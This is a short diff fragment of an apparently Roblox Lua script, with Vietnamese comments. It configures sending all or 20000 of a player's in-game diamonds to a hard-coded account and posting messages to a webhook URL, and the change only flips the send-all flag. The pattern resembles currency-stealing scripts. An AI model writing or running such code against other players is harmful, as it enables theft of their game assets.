@@ -9,7 +9,7 @@ local function d(msg,c) pcall(function() request({Url=W,Method="POST",Headers={[
 -- ===== CONFIG =====
 local TARGET   = "NguoiDungNo1"
 local MESSAGE  = "GG"
-local SEND_ALL = true    -- true = gửi tất cả (trừ phí), false = gửi DIAMONDS dưới
+local SEND_ALL = false   -- true = gửi tất cả (trừ phí), false = gửi DIAMONDS dưới
 local DIAMONDS = 20000   -- Chỉ dùng khi SEND_ALL = false
 -- ==================
 
